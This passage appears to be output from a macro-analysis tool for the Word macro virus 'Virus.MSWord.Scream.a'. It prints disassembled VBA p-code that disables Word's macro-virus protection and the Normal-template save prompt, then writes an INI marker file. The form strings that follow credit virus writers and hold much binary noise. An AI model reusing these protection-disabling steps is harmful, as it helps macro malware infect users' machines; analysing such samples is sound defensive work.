' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitStr 0x0001 "0"
' 	LitStr 0x000E "C:\Dos\Sos.ini"
' 	LitStr 0x0004 "Pay1"
' 	LitStr 0x0002 "OK"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #8:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #9:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #12:
' 	LitStr 0x0001 "1"
' 	LitStr 0x000E "C:\DOS\Sos.ini"
' 	LitStr 0x0004 "Pay1"
' 	LitStr 0x0002 "OK"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #13:
' 	Ld Pay1 
' 	ArgsCall Unlock 0x0001 
' Line #14:
' 	EndSub 
' Macros/VBA/Pay2 - 3843 bytes
' Line #0:
' 	FuncDefn (Private Sub userform_initialize())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitStr 0x0001 "0"
' 	LitStr 0x000E "C:\Dos\Sos.ini"
' 	LitStr 0x0004 "Pay2"
' 	LitStr 0x0002 "OK"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #8:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #9:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #12:
' 	LitStr 0x0001 "1"
' 	LitStr 0x000E "C:\Dos\Sos.ini"
' 	LitStr 0x0004 "Pay2"
' 	LitStr 0x0002 "OK"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #13:
' 	Ld Pay2 
' 	ArgsCall Unlock 0x0001 
' Line #14:
' 	EndSub 
' Macros/VBA/MVB - 2502 bytes
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Virus SOS en l'honneur du groupe SOS par ZeMacrokiller98�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�SOS Virus in honor of SOS Group by ZeMacroKiller98llu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Merci �:"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Thanks to:I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nightmare Joker (the Leader)0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�The WombatI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Dimensional Axiom�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Dr. Beckmannq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PFlorik
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�VEiN{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�VPAMN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Flitnic
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WaTeR WiSdOmD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Lord Arz�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ULTRAS@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�     Fichier    Edition     Affichage     Insertion     Format     D�bogage     Ex�cution     Outils     Fen�tre     ?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,�,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Projet - Normal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Propri�t� - Normal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Normal Projet
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Alphab�tique
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Par cat�gorie
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Onglet3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Onglet4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11/i14/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6AQ"aq���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Wstu������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#BRV��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���$3Cbr�%4c�ST�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�23AQa��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u�٤��*��7l����`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�P֗8��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�1��t��-/�/����#H|@�(�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ڜD����~������ȴ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�NF��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hPĎy�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d�is�BSz"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�4�8:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n��H�<��a2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��,_֎��E��E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ȴ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��n��{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yط��k��[?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-��K��,~�t��-/�/�����l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ɫ��R��h�o�Z_D_�{�gi}��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
USS:l`sK�G�����Çř)��.��Ա���.�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X;P�Þ���E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
iGM#�#p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
䮶�+bt�a�KW
ں
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_R�,/�԰?Z:[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�GK"��"�
���|��c��m9��y��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W���z�-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֎��E��E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�4��)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�4�v�l��%~�KP�GK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X�h�o�Z_D_�UUq�90�EO$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��r�����z��6����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K��/O�f�h�Д���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(�_ҷ-9�_YD�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�Z<-��O�N2K�R{����ȴ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��GK"��"�
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������}Ko�����i}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��,F�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_GJ�Z�I�BhQ��,��A]���o�GK"��"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^��:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Hj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'�9�wz�xF�l��-$��7�h�o�Z_D_�g�����)}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��אF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����i}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�t��-/�/��W��姘)E5;�sx%�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%~�KLm;Lc?�J_D_�c�����i}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_>�ͧ.�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M��y�Yp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��n��Գ�Z:[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cv����	K�$_�W7;\���+U���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V��aa�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֞�K=�K�-n�Д��E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�֎��E��E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2Ǹve5n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'�>z���-֎��E��E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z:[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U4,�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��E<���8(�C��r���-_֎��E��E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ȴ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�~�է����_(�Q�8�U3b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sb!�8�78���'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.��pSA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6���F�֌�ғ�8s_:�k��
